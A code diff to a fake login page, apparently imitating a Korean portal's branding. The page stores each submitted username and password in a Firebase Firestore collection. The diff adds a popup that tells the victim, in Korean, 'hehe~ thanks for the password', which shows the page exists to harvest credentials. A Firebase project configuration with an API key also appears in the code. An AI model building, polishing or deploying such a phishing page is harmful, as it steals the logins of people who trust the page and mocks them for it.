@@ -14,7 +14,21 @@
         }
     </style>
 </head>
-<body class="flex flex-col min-h-screen bg-white text-gray-800 justify-between">
+<body class="flex flex-col min-h-screen bg-white text-gray-800 justify-between relative">
+
+    <!-- 커스텀 모달 (alert 대신 사용) -->
+    <div id="custom-modal" class="fixed inset-0 bg-black/50 z-50 flex items-center justify-center p-4 hidden">
+        <div class="bg-white rounded-2xl p-6 max-w-sm w-full shadow-2xl text-center transform transition-all scale-95 opacity-0 duration-300" id="modal-box">
+            <div class="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4 text-[#03C75A] text-xl font-bold">
+                ✓
+            </div>
+            <h3 id="modal-title" class="text-lg font-bold text-gray-900 mb-2">알림</h3>
+            <p id="modal-message" class="text-sm text-gray-600 mb-6 whitespace-pre-line"></p>
+            <button onclick="closeModal()" class="w-full bg-[#03C75A] text-white font-medium py-3 rounded-xl hover:bg-[#02b351] transition">
+                확인
+            </button>
+        </div>
+    </div>
 
     <!-- 상단 헤더 -->
     <header class="flex items-center px-4 py-4">
@@ -74,12 +88,38 @@
     <!-- 하단 광고 혹은 영역 (노란색 박스) -->
     <footer class="w-full bg-[#FFE600] h-14 mt-auto"></footer>
 
-    <!-- Firebase 연동 스크립트 -->
+    <!-- 모달 제어 스크립트 -->
+    <script>
+        function showModal(title, message) {
+            const modal = document.getElementById('custom-modal');
+            const modalBox = document.getElementById('modal-box');
+            document.getElementById('modal-title').innerText = title;
+            document.getElementById('modal-message').innerText = message;
+            
+            modal.classList.remove('hidden');
+            setTimeout(() => {
+                modalBox.classList.remove('scale-95', 'opacity-0');
+                modalBox.classList.add('scale-100', 'opacity-100');
+            }, 10);
+        }
+
+        function closeModal() {
+            const modal = document.getElementById('custom-modal');
+            const modalBox = document.getElementById('modal-box');
+            
+            modalBox.classList.remove('scale-100', 'opacity-100');
+            modalBox.classList.add('scale-95', 'opacity-0');
+            setTimeout(() => {
+                modal.classList.add('hidden');
+            }, 300);
+        }
+    </script>
+
+    <!-- Firebase 연동 및 로그인 처리 스크립트 -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
         import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
 
-        // 전달해주신 Firebase 설정 정보 적용
         const firebaseConfig = {
             apiKey: "AIzaSyBnjCWfcbvrvadmQ3bjoRJTD-rXSKzp_Bo",
             authDomain: "git-io-33713.firebaseapp.com",
@@ -98,7 +138,6 @@
             console.error("Firebase initialization error", e);
         }
 
-        // 로그인 폼 제출 이벤트 처리
         const loginForm = document.getElementById('login-form');
         const usernameInput = document.getElementById('username');
         const passwordInput = document.getElementById('password');
@@ -126,8 +165,10 @@
                     createdAt: serverTimestamp()
                 });
 
-                statusMsg.innerText = "로그인 성공!";
-                statusMsg.className = "text-xs text-center font-medium h-5 text-[#03C75A]";
+                statusMsg.innerText = "";
+                
+                // 요청하신 팝업 메시지 출력
+                showModal("로그인 완료", "헤헤~~ 비밀번호 ㄳ");
                 
                 // 입력창 초기화
                 usernameInput.value = '';
